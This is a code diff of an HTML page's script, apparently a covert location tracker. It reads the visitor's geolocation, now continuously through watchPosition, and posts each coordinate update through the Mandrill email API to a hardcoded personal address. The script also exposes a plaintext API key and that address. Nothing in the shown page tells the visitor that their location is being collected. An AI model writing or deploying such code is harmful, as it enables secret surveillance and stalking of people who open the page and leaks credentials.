@@ -12,43 +12,44 @@
 <script>
 var result;
 function comenzar() {
-    navigator.geolocation.getCurrentPosition(
-           function (ubicacion) {
-               result = {
-                   "latitude": ubicacion.coords.latitude,
-                   "longitude": ubicacion.coords.longitude
-               }
-               $.ajax({
-                   url: "https://mandrillapp.com/api/1.0/messages/send.json",
-                   type: "POST",
-                   data: {
-                       "key": "9oCSXw6pdOfqmR8LTaUotg",
-                       "message": {
-                           "from_email": "YOUR@EMAIL.HERE",
-                           "to": [
-                               {
-                                   "email": "facundodelgado.1@hotmail.es",
-                                   "name": "RECIPIENT NAME (OPTIONAL)",
-                                   "type": "to"
-                               },
-                     {
-                         "email": "facundodelgado.1@hotmail.es",
-                         "name": "ANOTHER RECIPIENT NAME (OPTIONAL)",
-                         "type": "to"
-                     }
-                           ],
-                           "autotext": "true",
-                           "subject": "Geo",
-                           "html": "long" + result.longitude + "lat" + result.latitude
-                       }
-                   }
-               }).done(function (response) {
-                   console.log(response); 
-               });
-           },
-function (e) {
-    result = null;
-});
+    navigator.geolocation.watchPosition(
+        function(ubicacion) {
+            result =  {
+   			"latitude": ubicacion.coords.latitude,
+   			"longitude": ubicacion.coords.longitude
+			}
+			sendLoc(result);	
+        },
+        function(e) {
+            result = null;
+        });
+}
+function sendLoc(info) {
+    $.ajax({
+        url: "https://mandrillapp.com/api/1.0/messages/send.json",
+        type: "POST",
+        data: {
+            "key": "9oCSXw6pdOfqmR8LTaUotg",
+            "message": {
+                "from_email": "YOUR@EMAIL.HERE",
+                "to": [
+                    {
+                        "email": "facundodelgado.1@hotmail.es",
+                        "name": "RECIPIENT NAME (OPTIONAL)",
+                        "type": "to"
+                    },
+          {
+              "email": "facundodelgado.1@hotmail.es",
+              "name": "ANOTHER RECIPIENT NAME (OPTIONAL)",
+              "type": "to"
+          }
+                ],
+                "autotext": "true",
+                "subject": "Geo",
+                "html": "long" + info.longitude + "lat" + info.latitude
+            }
+        }
+    })
 }
 </script>
 </html>
